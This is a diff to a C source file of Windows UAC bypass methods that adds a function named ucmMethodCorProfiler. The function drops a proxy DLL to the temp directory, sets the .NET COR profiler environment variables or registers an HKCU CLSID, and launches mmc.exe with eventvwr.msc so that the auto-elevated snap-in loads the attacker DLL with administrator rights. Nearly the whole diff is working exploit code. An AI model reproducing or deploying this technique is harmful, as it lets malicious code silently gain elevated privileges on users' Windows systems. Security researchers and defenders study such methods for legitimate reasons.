@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.75
+*  VERSION:     2.77
 *
-*  DATE:        30 June 2017
+*  DATE:        21 July 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2009,6 +2009,114 @@ BOOL ucmSXSMethodDccw(
     if (bWusaNeedCleanup) {
         ucmWusaCabinetCleanup();
     }
+
+    return bResult;
+}
+
+/*
+* ucmMethodCorProfiler
+*
+* Purpose:
+*
+* Bypass UAC using COR profiler.
+* http://seclists.org/fulldisclosure/2017/Jul/11
+*
+*/
+BOOL ucmMethodCorProfiler(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL     bCond = FALSE, bResult = FALSE;
+    SIZE_T   sz = 0;
+    GUID     guid;
+    HKEY     hKey = NULL;
+    LRESULT  lResult;
+    LPOLESTR OutputGuidString = NULL;
+
+    WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return bResult;
+
+    do {
+        //
+        // Create unique GUID
+        //
+        if (CoCreateGuid(&guid) != S_OK)
+            break;
+
+        if (StringFromCLSID(&guid, &OutputGuidString) != S_OK)
+            break;
+
+        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcat(szBuffer, MYSTERIOSCUTETHING);
+        _strcat(szBuffer, TEXT(".dll"));
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+            break;
+
+        supSetEnvVariable(FALSE, COR_ENABLE_PROFILING, TEXT("1"));
+        supSetEnvVariable(FALSE, COR_PROFILER, OutputGuidString);
+
+        if (g_ctx.dwBuildNumber >= 9200) {
+            supSetEnvVariable(FALSE, COR_PROFILER_PATH, szBuffer);
+        }
+        else {
+            //
+            // On Windows 7 target written on 3+ dotnet, registration required.
+            //
+            _strcpy(szRegBuffer, TEXT("Software\\Classes\\CLSID\\"));
+            _strcat(szRegBuffer, OutputGuidString);
+            _strcat(szRegBuffer, TEXT("\\InProcServer32"));
+
+            hKey = NULL;
+            lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
+                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+            if (lResult == ERROR_SUCCESS) {
+
+                sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
+                lResult = RegSetValueEx(
+                    hKey,
+                    TEXT(""),
+                    0,
+                    REG_SZ,
+                    (BYTE*)szBuffer,
+                    (DWORD)sz);
+
+                RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
+                _strcpy(szRegBuffer, TEXT("Apartment"));
+                sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
+                lResult = RegSetValueEx(
+                    hKey,
+                    TEXT("ThreadingModel"),
+                    0,
+                    REG_SZ,
+                    (BYTE*)szRegBuffer,
+                    (DWORD)sz);
+
+                RegCloseKey(hKey);
+            }
+        }
+
+        //
+        // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
+        //
+        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, FALSE);
+
+    } while (bCond);
+
+    //
+    // Cleanup.
+    //
+    if (OutputGuidString != NULL) {
+        supSetEnvVariable(TRUE, COR_PROFILER, NULL);
+        CoTaskMemFree(OutputGuidString);
+    }
+
+    supSetEnvVariable(TRUE, COR_ENABLE_PROFILING, NULL);
+
+    if (g_ctx.dwBuildNumber >= 9200)
+        supSetEnvVariable(TRUE, COR_PROFILER_PATH, NULL);
 
     return bResult;
 }
